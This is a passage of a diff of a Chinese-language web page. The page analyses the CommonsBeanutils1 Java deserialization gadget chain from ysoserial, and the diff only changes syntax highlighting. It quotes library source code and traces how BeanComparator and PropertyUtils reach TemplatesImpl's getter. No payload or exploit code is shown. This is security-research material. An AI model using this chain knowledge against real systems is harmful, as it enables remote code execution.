-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> right <span style="color:#f92672">=</span> child <span style="color:#f92672">+</span> 1;
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (right <span style="color:#f92672">&lt;</span> size <span style="color:#f92672">&amp;&amp;</span>
-</span></span><span style="display:flex;"><span>                comparator.<span style="color:#a6e22e">compare</span>((E) c, (E) queue<span style="color:#f92672">[</span>right<span style="color:#f92672">]</span>) <span style="color:#f92672">&gt;</span> 0)
-</span></span><span style="display:flex;"><span>                c <span style="color:#f92672">=</span> queue<span style="color:#f92672">[</span>child <span style="color:#f92672">=</span> right<span style="color:#f92672">]</span>;
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (comparator.<span style="color:#a6e22e">compare</span>(x, (E) c) <span style="color:#f92672">&lt;=</span> 0)
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
-</span></span><span style="display:flex;"><span>            queue<span style="color:#f92672">[</span>k<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> c;
-</span></span><span style="display:flex;"><span>            k <span style="color:#f92672">=</span> child;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        queue<span style="color:#f92672">[</span>k<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> x;
-</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">siftDownUsingComparator</span><span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> k<span style="color:#f92672">,</span> E x<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> half <span style="color:#f92672">=</span> size <span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#f92672">(</span>k <span style="color:#f92672">&lt;</span> half<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> child <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>k <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">)</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            Object c <span style="color:#f92672">=</span> queue<span style="color:#f92672">[</span>child<span style="color:#f92672">];</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> right <span style="color:#f92672">=</span> child <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>right <span style="color:#f92672">&lt;</span> size <span style="color:#f92672">&amp;&amp;</span>
+</span></span><span style="display:flex;"><span>                comparator<span style="color:#f92672">.</span><span style="color:#a6e22e">compare</span><span style="color:#f92672">((</span>E<span style="color:#f92672">)</span> c<span style="color:#f92672">,</span> <span style="color:#f92672">(</span>E<span style="color:#f92672">)</span> queue<span style="color:#f92672">[</span>right<span style="color:#f92672">])</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>                c <span style="color:#f92672">=</span> queue<span style="color:#f92672">[</span>child <span style="color:#f92672">=</span> right<span style="color:#f92672">];</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>comparator<span style="color:#f92672">.</span><span style="color:#a6e22e">compare</span><span style="color:#f92672">(</span>x<span style="color:#f92672">,</span> <span style="color:#f92672">(</span>E<span style="color:#f92672">)</span> c<span style="color:#f92672">)</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            queue<span style="color:#f92672">[</span>k<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> c<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            k <span style="color:#f92672">=</span> child<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        queue<span style="color:#f92672">[</span>k<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> x<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
 </span></span></code></pre></div><p>BeanComparator实现了Comparator接口，compare方法代码如下，其会调用getProperty方法，前面在ysoserial中property被设置为outputProperities</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">compare</span>(T o1, T o2) {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">property</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">internalCompare</span>(o1, o2);
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
-</span></span><span style="display:flex;"><span>                Object value1 <span style="color:#f92672">=</span> PropertyUtils.<span style="color:#a6e22e">getProperty</span>(o1, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">property</span>);
-</span></span><span style="display:flex;"><span>                Object value2 <span style="color:#f92672">=</span> PropertyUtils.<span style="color:#a6e22e">getProperty</span>(o2, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">property</span>);
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">internalCompare</span>(value1, value2);
-</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> (IllegalAccessException var5) {
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> RuntimeException(<span style="color:#e6db74">&#34;IllegalAccessException: &#34;</span> <span style="color:#f92672">+</span> var5.<span style="color:#a6e22e">toString</span>());
-</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> (InvocationTargetException var6) {
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> RuntimeException(<span style="color:#e6db74">&#34;InvocationTargetException: &#34;</span> <span style="color:#f92672">+</span> var6.<span style="color:#a6e22e">toString</span>());
-</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> (NoSuchMethodException var7) {
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> RuntimeException(<span style="color:#e6db74">&#34;NoSuchMethodException: &#34;</span> <span style="color:#f92672">+</span> var7.<span style="color:#a6e22e">toString</span>());
-</span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">compare</span><span style="color:#f92672">(</span>T o1<span style="color:#f92672">,</span> T o2<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">property</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">internalCompare</span><span style="color:#f92672">(</span>o1<span style="color:#f92672">,</span> o2<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                Object value1 <span style="color:#f92672">=</span> PropertyUtils<span style="color:#f92672">.</span><span style="color:#a6e22e">getProperty</span><span style="color:#f92672">(</span>o1<span style="color:#f92672">,</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">property</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                Object value2 <span style="color:#f92672">=</span> PropertyUtils<span style="color:#f92672">.</span><span style="color:#a6e22e">getProperty</span><span style="color:#f92672">(</span>o2<span style="color:#f92672">,</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">property</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">internalCompare</span><span style="color:#f92672">(</span>value1<span style="color:#f92672">,</span> value2<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>IllegalAccessException var5<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> RuntimeException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;IllegalAccessException: &#34;</span> <span style="color:#f92672">+</span> var5<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>InvocationTargetException var6<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> RuntimeException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;InvocationTargetException: &#34;</span> <span style="color:#f92672">+</span> var6<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>NoSuchMethodException var7<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> RuntimeException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;NoSuchMethodException: &#34;</span> <span style="color:#f92672">+</span> var7<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
 </span></span></code></pre></div><p>
 <img alt="" src="/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/4.png" /></p>
 <p>跟进getProperty方法内，其中bean为<code>TemplatesImpl</code>对象，会进入<code>bean = this.getSimpleProperty(bean, name);</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Object <span style="color:#a6e22e">getProperty</span>(Object bean, String name) <span style="color:#66d9ef">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> PropertyUtilsBean.<span style="color:#a6e22e">getInstance</span>().<span style="color:#a6e22e">getProperty</span>(bean, name);
-</span></span><span style="display:flex;"><span>    }
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Object <span style="color:#a6e22e">getProperty</span><span style="color:#f92672">(</span>Object bean<span style="color:#f92672">,</span> String name<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> IllegalAccessException<span style="color:#f92672">,</span> InvocationTargetException<span style="color:#f92672">,</span> NoSuchMethodException <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> PropertyUtilsBean<span style="color:#f92672">.</span><span style="color:#a6e22e">getInstance</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getProperty</span><span style="color:#f92672">(</span>bean<span style="color:#f92672">,</span> name<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getProperty</span>(Object bean, String name) <span style="color:#66d9ef">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getNestedProperty</span>(bean, name);
-</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getProperty</span><span style="color:#f92672">(</span>Object bean<span style="color:#f92672">,</span> String name<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> IllegalAccessException<span style="color:#f92672">,</span> InvocationTargetException<span style="color:#f92672">,</span> NoSuchMethodException <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getNestedProperty</span><span style="color:#f92672">(</span>bean<span style="color:#f92672">,</span> name<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getNestedProperty</span>(Object bean, String name) <span style="color:#66d9ef">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (bean <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalArgumentException(<span style="color:#e6db74">&#34;No bean specified&#34;</span>);
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (name <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalArgumentException(<span style="color:#e6db74">&#34;No name specified for bean class &#39;&#34;</span> <span style="color:#f92672">+</span> bean.<span style="color:#a6e22e">getClass</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span>);
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">hasNested</span>(name)) {
-</span></span><span style="display:flex;"><span>                String next <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">next</span>(name);
-</span></span><span style="display:flex;"><span>                Object nestedBean <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (bean <span style="color:#66d9ef">instanceof</span> Map) {
-</span></span><span style="display:flex;"><span>                    nestedBean <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getPropertyOfMapBean</span>((Map)bean, next);
-</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">isMapped</span>(next)) {
-</span></span><span style="display:flex;"><span>                    nestedBean <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getMappedProperty</span>(bean, next);
-</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">isIndexed</span>(next)) {
-</span></span><span style="display:flex;"><span>                    nestedBean <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getIndexedProperty</span>(bean, next);
-</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>                    nestedBean <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getSimpleProperty</span>(bean, next);
-</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> Object <span style="color:#a6e22e">getNestedProperty</span><span style="color:#f92672">(</span>Object bean<span style="color:#f92672">,</span> String name<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> IllegalAccessException<span style="color:#f92672">,</span> InvocationTargetException<span style="color:#f92672">,</span> NoSuchMethodException <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>bean <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalArgumentException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;No bean specified&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>name <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalArgumentException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;No name specified for bean class &#39;&#34;</span> <span style="color:#f92672">+</span> bean<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">()</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">resolver</span><span style="color:#f92672">.</span><span style="color:#a6e22e">hasNested</span><span style="color:#f92672">(</span>name<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                String next <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">resolver</span><span style="color:#f92672">.</span><span style="color:#a6e22e">next</span><span style="color:#f92672">(</span>name<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                Object nestedBean <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>bean <span style="color:#66d9ef">instanceof</span> Map<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                    nestedBean <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getPropertyOfMapBean</span><span style="color:#f92672">((</span>Map<span style="color:#f92672">)</span>bean<span style="color:#f92672">,</span> next<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">resolver</span><span style="color:#f92672">.</span><span style="color:#a6e22e">isMapped</span><span style="color:#f92672">(</span>next<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                    nestedBean <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getMappedProperty</span><span style="color:#f92672">(</span>bean<span style="color:#f92672">,</span> next<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">resolver</span><span style="color:#f92672">.</span><span style="color:#a6e22e">isIndexed</span><span style="color:#f92672">(</span>next<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                    nestedBean <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getIndexedProperty</span><span style="color:#f92672">(</span>bean<span style="color:#f92672">,</span> next<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                    nestedBean <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getSimpleProperty</span><span style="color:#f92672">(</span>bean<span style="color:#f92672">,</span> next<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (nestedBean <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
-</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> NestedNullException(<span style="color:#e6db74">&#34;Null property value for &#39;&#34;</span> <span style="color:#f92672">+</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; on bean class &#39;&#34;</span> <span style="color:#f92672">+</span> bean.<span style="color:#a6e22e">getClass</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span>);
-</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>nestedBean <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> NestedNullException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Null property value for &#39;&#34;</span> <span style="color:#f92672">+</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39; on bean class &#39;&#34;</span> <span style="color:#f92672">+</span> bean<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">()</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>                bean <span style="color:#f92672">=</span> nestedBean;
-</span></span><span style="display:flex;"><span>                name <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">remove</span>(name);
-</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>                bean <span style="color:#f92672">=</span> nestedBean<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>                name <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">resolver</span><span style="color:#f92672">.</span><span style="color:#a6e22e">remove</span><span style="color:#f92672">(</span>name<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (bean <span style="color:#66d9ef">instanceof</span> Map) {
-</span></span><span style="display:flex;"><span>                bean <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getPropertyOfMapBean</span>((Map)bean, name);
-</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">isMapped</span>(name)) {
-</span></span><span style="display:flex;"><span>                bean <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getMappedProperty</span>(bean, name);
-</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolver</span>.<span style="color:#a6e22e">isIndexed</span>(name)) {
-</span></span><span style="display:flex;"><span>                bean <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getIndexedProperty</span>(bean, name);
-</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>                bean <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getSimpleProperty</span>(bean, name);
-</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>bean <span style="color:#66d9ef">instanceof</span> Map<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                bean <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getPropertyOfMapBean</span><span style="color:#f92672">((</span>Map<span style="color:#f92672">)</span>bean<span style="color:#f92672">,</span> name<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">resolver</span><span style="color:#f92672">.</span><span style="color:#a6e22e">isMapped</span><span style="color:#f92672">(</span>name<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                bean <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getMappedProperty</span><span style="color:#f92672">(</span>bean<span style="color:#f92672">,</span> name<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">resolver</span><span style="color:#f92672">.</span><span style="color:#a6e22e">isIndexed</span><span style="color:#f92672">(</span>name<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                bean <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getIndexedProperty</span><span style="color:#f92672">(</span>bean<span style="color:#f92672">,</span> name<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                bean <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getSimpleProperty</span><span style="color:#f92672">(</span>bean<span style="color:#f92672">,</span> name<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> bean;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> bean<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
 </span></span></code></pre></div><p>在<code>getSimpleProperty</code>方法内会通过反射获取到<code>TemplatesImpl</code>对象<code>property</code>对应的的getter方法并调用，在java规范中outputProperities对应的getter方法名应该为getOutputProperities</p>
